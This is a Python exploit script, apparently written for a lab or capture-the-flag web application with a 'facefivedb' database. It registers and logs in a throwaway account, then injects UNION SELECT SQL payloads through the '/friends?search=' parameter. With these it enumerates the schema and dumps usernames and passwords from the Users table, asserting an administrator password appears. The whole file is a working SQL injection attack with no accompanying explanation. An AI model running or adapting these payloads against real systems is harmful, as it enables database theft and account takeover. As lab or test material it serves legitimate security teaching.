import requests, sys, random
from urllib.parse import quote_plus

SERVER = sys.argv[1]
session = requests.session()

user = str(random.randint(2**27, 2**28))
password = str(random.randint(2**27, 2**28))

params = {'password' : password, 'username' : user}
r = session.post(SERVER + '/register', data=params)

params = {'password' : password, 'username' : user}
r = session.post(SERVER + '/login', data=params, cookies=session.cookies)

assert user in r.text

SCHEMA = "z' UNION SELECT TABLE_NAME,2,3,4,5 FROM TABLES #"

r = session.get(SERVER + "/friends?search=" + quote_plus(SCHEMA), cookies=session.cookies)

assert "facefivedb" in r.text

TABLES = "z' UNION SELECT TABLE_NAME,2,3,4,5 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'facefivedb' #"

r = session.get(SERVER + "/friends?search=" + quote_plus(TABLES), cookies=session.cookies)

# In this example we will leak usernames and passwords stored in the table Users
assert "Users" in r.text

COLUMNS = "z' UNION SELECT COLUMN_NAME,2,DATA_TYPE,4,5 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Users' #"

r = session.get(SERVER + "/friends?search=" + quote_plus(COLUMNS), cookies=session.cookies)

assert "username" in r.text 
assert "password" in r.text

USERS = "z' UNION SELECT username,2,password,4,5 FROM Users #"

r = session.get(SERVER + "/friends?search=" + quote_plus(USERS), cookies=session.cookies)

assert "administrator : AVeryL33tPasswd" in r.text
